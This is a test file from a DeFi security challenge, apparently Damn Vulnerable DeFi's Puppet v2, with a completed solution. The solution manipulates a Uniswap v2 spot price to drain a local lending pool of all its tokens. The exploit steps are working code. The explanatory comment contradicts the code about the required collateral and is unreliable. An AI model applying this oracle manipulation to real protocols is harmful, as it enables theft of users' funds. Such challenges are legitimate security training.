const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE 
        The solution is:
        1. Swap the attacker’s DVT token for ETH thus depleting the WETH balance
        2. Wrap the attacker’s ETH and approve it to the pool
        3. Borrow all tokens from the pool.

        from the PupperV2Pool, it need to check depositRequired again but this time 
        use UniswapV2Library.quote in function _getOracleQuote
   
        Look at library from https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol
        function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
            require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
            require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
            amountB = amountA.mul(reserveB) / reserveA;
        }

        We not see much different from previous challenge because not check if reserveA > reserveB =0
        amount = amountA, reservesToken = reserveA, reservesWETH = reserveB
        It means if DVT token > amount*WETH =0
        In this case, DVT = 10100, WETH=0.09, amount=29.496 => 2.65464/10100 = 0
        We can lending all tokens from pool without deposit ETH.
        */
        console.log("[Begin]");
        console.log("- Uniswap v2 exchange");
        console.log("Uni DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))).toString()); 
        console.log("Uni WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapExchange.address))).toString()); 
        console.log("- Attacker");
        console.log("Attacker ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString()); // attacker ETH
        console.log("Attacker DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString()); // attacker DTV
        console.log("Attacker WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(attacker.address))).toString()); // attacker WETH
        
        const path = [];
        path[0] = this.token.address;
        path[1] = this.weth.address;

        // swap all DVT tokens for ETH
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        const timeStamp = (await ethers.provider.getBlock('latest')).timestamp * 2;
        const tx = await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
            ATTACKER_INITIAL_TOKEN_BALANCE, // Swap lall of the attacker's tokens
            0,                              // We don't care how much ether we get back. 
            path,                           // Swap path from token to ether.
            attacker.address,               // Ether to attacker account.
            timeStamp                       // Deadline
        );
        await tx.wait();
        
        console.log("[Attacker sell all DVT to ETH");
        console.log("- Uniswap v2 exchange");
        console.log("Uni DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))).toString()); 
        console.log("Uni WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapExchange.address))).toString()); 
        console.log("- Attacker");
        console.log("Attacker ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString()); // attacker ETH
        console.log("Attacker DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString()); // attacker DTV
        console.log("Attacker WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(attacker.address))).toString()); // attacker WETH
        console.log("- Lending Pool");
        console.log("Pool ETH: " +(ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address))).toString()); 

        // Collateral required to borrow all of the pool's DVT is now about 29.5 ether.
        const collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log('Required collateral in eth:', (ethers.utils.formatEther(collateral).toString()));
        // Convert ether to WETH, give allowance to pool contract and use it to borrow DVT.
        // Allows borrowing `borrowAmount` of tokens by first depositing their value in WETH
        // Sender must have approved enough WETH in advance.
        await this.weth.connect(attacker).deposit({ value: collateral });
        await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
        //lend all tokens in pool
        const tx2 = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
        await tx2.wait();

        console.log("[After]");
        console.log("- Uniswap v2 exchange");
        console.log("Uni DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))).toString()); 
        console.log("Uni WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapExchange.address))).toString()); 
        console.log("- Attacker");
        console.log("Attacker ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString()); // attacker ETH
        console.log("Attacker DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString()); // attacker DTV
        console.log("Attacker WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(attacker.address))).toString()); // attacker WETH
        console.log("- Lending Pool");
        console.log("Pool ETH: " +(ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address))).toString()); 

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});